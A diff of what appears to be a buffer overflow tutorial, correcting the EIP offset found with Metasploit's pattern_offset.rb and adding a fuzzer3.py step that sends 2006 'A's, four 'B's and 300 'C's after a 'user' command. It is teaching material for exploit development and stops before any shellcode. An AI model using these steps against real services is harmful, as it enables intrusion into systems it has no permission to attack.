@@ -32,9 +32,13 @@ The program will crash quickly, but our python script will be hung, just hit ctr
 
 ` /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396F4338`
 
-In a couple seconds the program will return the offset, in my test this was 2002 characters. Now we copy fuzzer2.py to make fuzzer3.py `cp fuzzer2.py fuzzer3.py`.
+In a couple seconds the program will return the offset, in my test this was 2006 characters. Now we copy fuzzer2.py to make fuzzer3.py:
+`cp fuzzer2.py fuzzer3.py`.
 
+So now in fuzzer3 we change up what we are sending:
+`client.send("user " + "A" * 2006 + "B" * 4 + "C" * 300)`
 
+This will send 2006 A's, followed by 4 B's and 300 C's.
 
 
 *rest of article coming soon*
